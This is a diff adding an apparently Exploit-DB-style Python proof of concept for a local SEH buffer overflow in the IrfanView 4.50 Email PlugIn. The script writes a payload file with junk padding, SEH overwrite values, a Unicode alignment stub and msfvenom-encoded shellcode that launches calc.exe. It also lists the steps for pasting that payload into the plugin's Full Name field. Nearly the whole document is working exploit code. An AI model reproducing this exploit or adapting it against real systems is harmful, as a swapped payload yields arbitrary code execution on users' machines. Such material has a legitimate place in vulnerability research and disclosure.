@@ -1,0 +1,75 @@
+#!/usr/bin/python
+
+#
+# Exploit Author: bzyo
+# Twitter: @bzyo_
+# Exploit Title: IrfanView 4.50 Email PlugIn - Local Buffer Overflow (SEH Unicode)
+# Date: 02-07-2018
+# Vulnerable Software: IrfanView 4.50 Email PlugIn
+# Vendor Homepage: http://www.irfanview.com/
+# Version: 4.50
+# Software Link: http://www.irfanview.info/files/irfanview_450.exe
+# Software Link: http://www.irfanview.info/files/irfanview_plugins_450.zip
+# Tested Windows 7 SP1 x86
+#
+# More reliable result if .NET and updates installed prior to application being installed
+# 
+#
+# PoC
+# 1. generate irfan.txt, copy contents to clipboard
+# 2. open IrfanView and a sample image from My Pictures (i.e. Chrysanthemum.jpg)
+# 3. select Options, Send by Email, Settings
+# 4. paste contents from clipboard into Full Name and select OK
+# 5. application crashes
+# 6. pop calc
+#   ****if calc doesn't pop on first try, repeat steps 2-4 until it does :/
+#
+
+filename="irfan.txt"
+
+#junk to offset
+junk = "\x41"*262
+
+#popad
+nseh = "\x61\x62"
+
+#0x00500102 pop esi pop ebx  ret  
+#unicode possible ansi transform(s) : 0050008A->00500106,ascii {PAGE_EXECUTE_READ} [i_view32.exe] 
+seh = "\x8a\x50"
+
+valign = (
+"\x55" 			#push ebp
+"\x47" 			#align
+"\x58" 			#pop eax
+"\x47" 			#align
+"\x05\x14\x11" 	#add eax,400
+"\x47"			#align
+"\x2d\x13\x11"	#sub eax,300
+"\x47"			#align
+"\x50"			#push eax
+"\x47"			#align
+"\xc3"			#retn
+)
+
+#nops to shellcode
+nops = "\x71" * 109
+
+#msfvenom -p windows/exec CMD=calc.exe -e x86/unicode_upper BufferRegister=EAX
+calc = (
+"PPYAIAIAIAIAQATAXAZAPU3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZ"
+"ABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBKLJHE2KPKPM0C0U9IU01I02D4K0P004"
+"K0RLLTK0RLT4KT2NHLOH7OZO601KOVLOLQQSLLBNLMPWQHOLMM197K2KBQB0WTK0RN0DKPJOLDK0LLQR"
+"XIS18M1J121TK1IMPKQYC4KPILXJCOJQ9TKOD4KKQ8VP1KOFL91XOLMM1WWP8IPD5ZVLCCMKHOKSMO42"
+"UK428DKPXNDM1ICBFTKLLPKDKB8MLM19CDKLD4KKQHP3YQ4O4MTQKQK1Q291JPQKOIP1OQOPZ4KLRJK4M"
+"1MRJM14MU5WBM0M0M0R0QX014K2OTGKO9EGKL06UFBB6C85VF5GM5MKOJ5OLKVSLKZE0KKIPBUM57KQ7M"
+"CSB2ORJM0PSKOIEBCC1BL1SNN2E2XC5M0AA"
+)
+
+#necessary fill
+fill = "\x71"*1000
+
+buffer = junk + nseh + seh + valign + nops + calc + fill
+
+textfile = open(filename , 'w')
+textfile.write(buffer)
+textfile.close()
